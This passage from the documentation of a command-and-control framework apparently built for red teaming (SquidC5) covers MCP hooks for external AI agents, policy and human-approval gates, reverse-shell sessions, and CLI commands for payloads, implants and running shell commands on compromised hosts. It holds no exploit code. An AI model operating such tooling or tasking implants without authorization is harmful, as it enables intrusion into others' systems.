| Team chat | `POST /api/v1/collab/chat` with optional `team_id` |
| My audit | `GET /api/v1/audit/me` or `?mine=true` |

Claim lock is enforced on shell, tasks, and file ops (admins bypass). Default TTL: `SQUIDC5_SESSION_CLAIM_TTL_SEC` (3600; `0` = no expiry). Feature flag: `collab_teams`.

### Example

```bash
sc5 teams create red-cell
# claim via Ops context rail or REST
```

### See also

- [Runbook - Teams and collab](operator-runbook.md#teams-and-collab)
- [Identity](#identity)

---

## Feature toggles

### What

Runtime kill-switches enforced by the server (MCP, AI paths, listener kinds, etc.).

### Why

Incident response: disable a capability without redeploying. Defaults stay secure; `public_docs` **cannot** be enabled.

### How

```bash
curl -sk -H "Authorization: Bearer $TOK" https://HOST:8443/api/v1/features
# PUT with admin to flip allowed flags
```

UI: **Admin** -> features -> **Save**.

### Example

```text
Admin -> Features -> smtp_oast on -> Save (for SMTP OAST lab)
```

### See also

- [Security model](#security-model)
- [MCP tools](#mcp-tools)

---

## Policy

### What

Risk / allow-deny engine: thresholds, HITL gates, chain limits for humans, MCP, and Admin AI.

### Why

High-risk actions can require human approval or be denied outright - rails for AI and automation.

### How

1. **Get policy** - current JSON.
2. Edit carefully -> **Save policy**.
3. Bad policy can lock operators out or weaken guardrails - treat as production config.

### Example

```bash
sc5 policy get
sc5 policy set --file rules.json
sc5 policy hitl list
```

### See also

- [INKO](#inko-intelligent-neural-kinetic-operator)
- [MCP tools](#mcp-tools)

---

## MCP tools

### What

Bridge for **external** AI/tools using an allow-listed tool-call pattern (Model Context Protocol style). External models invoke *named tools* with JSON arguments; SquidC5 executes only tools on that token's allow-list.

### Why

External models must not get open-ended shell on the C2:

- **Least privilege** - `mcp:connect` + explicit `mcp_tools`
- **Determinism** - prefer single-step tools over autonomous multi-hop agents
- **Audit** - each call is logged
- **Default off** - feature flag until an engagement needs it

### How

1. Enable MCP via features when approved.
2. Mint a token with `mcp:connect` and a tight `mcp_tools` list.
3. **List tools** / **Call** with JSON args from Ops or CLI.

### Example

```bash
sc5 tokens create ext-ai \
 --scopes "mcp:connect,sessions:read,tasks:read,tasks:write,metrics:read" \
 --mcp-tools "list_sessions,get_session,list_tasks,create_task,get_metrics"
sc5 mcp tools
sc5 mcp call list_sessions --args-json '{}'
```

### Contrast: MCP vs INKO / Admin AI

| | INKO / Admin AI | MCP |
|--|----------------|-----|
| Who | Operators on the team server | External models / agents |
| Gate | `ai:use` + capability / chat-tool allow-list | `mcp:connect` + per-tool allow-list |
| Default | Offline fallback if no LLM | Often feature-off |

### See also

- [INKO](#inko-intelligent-neural-kinetic-operator)
- [Tokens](#tokens)
- [Vision - Dual AI](squidc5-vision.md#dual-ai-architecture)

---

## Verified reverse shells

### What

Live TCP reverse shells that passed classification + exec probe (`verified: true`).

### Why

Prefer these for Shell commands. Dead/echo-only connections are reaped.

### How

See [Shell](#shell) and [Listeners](#listeners). Dashboard and Sessions highlight verified shells.

### Example

```bash
sc5 sessions list --shells
# look for verified: true
```

### See also

- [Shell](#shell)
- [Event stream](#event-stream)

---

## Signal

### What

Quick metric chips from the last poll (stabilized, false positives, AI calls, etc.).

### Why

Confirm the API is healthy and counters are moving without opening full Observability.

### How

Visible on Dashboard / top status after connect. Soft refresh updates chips without wiping focused form fields.

### Example

```text
Dashboard -> Signal chips tick after shell.verified / ai.admin.chat
```

### See also

- [Status overview](#status-overview)
- [Observability](#observability)

---

## CLI reference

### What

Primary entry points after `pip install -e .` or binary install: `sc5` / `squidc5-cli`.

### Why

Scriptable ops and headless operator workflows; same scopes as Ops UI.

### How

```bash
sc5 login --url <base> --token <sc5_...> [--insecure]
sc5 health | whoami | metrics | audit [--limit N] | events | repl
sc5 sessions list|get|close|reap
sc5 tasks list|get|create
sc5 listeners list|create|start|stop|delete
sc5 payloads templates|generate
sc5 profiles list|activate
sc5 implants families|build|generate
sc5 oast token create | tokens list | hits
sc5 shell <session_id> "<cmd>" | sc5 shell all "<cmd>"
sc5 tokens list|create|update|revoke
sc5 ai <capability> [--data "..."] [--llm <id>]
sc5 llm list|add
sc5 mcp tools|call
sc5 policy get|set | hitl list|approve|deny
sc5 backup | restore
sc5 audit-verify
sc5 report
```

Config: `~/.config/squidc5/config.json` (never commit). 
Env: `SQUIDC5_URL`, `SQUIDC5_TOKEN` (and `SC5_*` aliases).

### Example

```bash
sc5 login --url https://HOST:8443 --token sc5_... --insecure
sc5 sessions list
sc5 audit-verify --limit 200
```

### See also

- **Full CLI surface:** [AGENTS.md](../AGENTS.md)
- [Operator runbook](operator-runbook.md)

---

## Deployment

### What

How to run SquidC5 in lab (Docker) vs production (CI binary only).

### Why

Prod must not run WIP trees or untested feature-branch binaries.

### How

**Lab (Docker):**

```bash
docker compose up --build -d
docker exec squidc5 cat /data/admin_token.txt
```

**Production (binary only):**

1. PR -> CI green -> merge `master`
2. CI builds `squidc5-linux-x64` + GitHub Release
3. Deploy **that binary only**; keep `data/` intact

### Example

See full steps in [deployment.md](deployment.md).

### See also

- [Deployment](deployment.md)
- [Prod readiness](prod-readiness-plan.md)

---

## Troubleshooting

### What

Common failure modes and first checks.

### Why

C2 ops failures are often listener, network, or scope issues - not "the UI is broken."

### How

| Symptom | Checks |
|---------|--------|
| Reverse shell never appears | Listener `running`? Firewall? Port publish (Docker bridge)? Privileged port sysctl? |
| Shell listed but mute | Exec probe failed -> reaped; false-shell filter / stage-2 |
| Admin panels missing | Token scopes? Hard-refresh? Admin JS 403? |
| CORS errors | Open `/ops` on the C2 host, not `file://` or wrong origin |
| Beacon no tasks | Wrong session id? [Profile mismatch](#c2-profiles-profiles)? Listener kind `http`? |
| AI offline only | No LLM under [LLM connections](#llm-connections) |
| OAST DNS silent | Zone NS / [OAST deploy](deployment.md#oast-collaborator-dns-http-smtp) |
| TLS still old after activate | Restart process after [TLS library](#tls-certificate-library) activate |

### Example

```bash
sc5 listeners list
sc5 sessions list --shells --include-dead
sc5 health
```

### See also

- [Runbook - If reverse shell fails](operator-runbook.md#if-reverse-shell-fails)
- [Deployment](deployment.md)

---

## Authorized use reminder

SquidC5 is for **authorized** security testing and education only. Unauthorized access to computer systems is illegal. Operators are responsible for obtaining proper authorization and staying within ROE.

### See also

- [SECURITY.md](../SECURITY.md)
- [Threat model](threat-model.md)
